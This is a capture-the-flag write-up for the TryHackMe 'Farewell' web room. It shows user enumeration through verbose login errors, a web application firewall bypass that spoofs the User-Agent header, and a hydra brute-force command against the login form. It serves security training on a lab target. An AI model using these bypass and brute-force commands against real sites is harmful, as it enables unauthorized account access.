[Farewell](https://tryhackme.com/room/farewell) is a Web challenge hosted on Tryhackme whose focus is on bypassing a Web Application Firewall. Let's change things up by immediately going into the website. The description tells us to check out `http://farewell.thm/status.php`. Doing so shows us the current status of the "Admin page"

![](./images/img1.png)

Going one page up sends us to a login page telling us to send one final farewell message before the server is decommissioned.

![](./images/img2.png)

Most notable discovery are the users: adam, deliver11, nora. Also, the admin page can be reached via `/admin.php`. Further enumeration shows that a `phpinfo` page can be reached via `/info.php`. Next, I decided to check out the login process. We first send a basic POST request to `/auth.php` with the parameters username and password. I saw that the server responds to authentication attempts via JSON and even gives out hints. (only on valid users tho)

![](./images/img3.png)

testing on the three gave me:

- adam : "favorite pet + 2"
- deliver11: "capital of japan followed by four digits"
- nora: "lucky number 789"

"deliver11" seems pretty verbose. I'll try to bruteforce it using hydra. I will create every possible four digits using the `seq` command in linux via `seq -w 4 9999`. I went on to attempt a bruteforce with both `tokyo` and `Tokyo`, but none of them returned a match. Remember how I said this machine is about bypassing a WAF? this is where that comes into play.

```
$ curl http://farewell.thm/auth.php --data 'username=deliver11&password=tokyo1911'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>403 Forbidden</title>
...
```

When I tried to do the same request via cURL, I got a 403 error telling me that the WAF is active. but copying the request from burpsuite via "copy as curl command (bash)" I was able to get a proper response. Through trial and error, I eventually found out that the WAF determines whether or not a client is legitimate via the 'User-agent' header.

```
$ curl http://farewell.thm/auth.php -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' --data 'username=deliver11&password=tokyo1911'
{"error":"auth_failed","user":{"name":"deliver11","last_password_change":"2025-09-10 11:00:00","password_hint":"Capital of Japan followed by 4 digits"}}
```

I will continue to use hydra to bruteforce `deliver11`'s password. This time I will set the `User-agent` header like so:

```
$ hydra -l deliver11 -P fourdigits.txt -I farewell.thm http-post-form "/auth.php:username=^USER^&password=tokyo^PASS^:auth_failed:H=User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0'"
```